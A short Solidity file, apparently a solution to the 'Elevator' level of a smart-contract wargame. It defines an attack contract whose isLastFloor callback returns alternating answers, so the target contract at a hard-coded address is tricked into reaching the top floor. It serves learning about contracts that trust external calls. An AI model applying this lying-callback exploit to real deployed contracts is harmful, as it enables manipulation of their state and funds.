// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Elevator.sol";

contract ElevatorAttack {
  Elevator elevator = Elevator(0x2b961E3959b79326A8e7F64Ef0d2d825707669b5);
  bool public last = false;

  function isLastFloor(uint _floor) public returns(bool) {
    last = !last;
    return !last;
  }

  function goTo() public {
    elevator.goTo(10);
  }
}
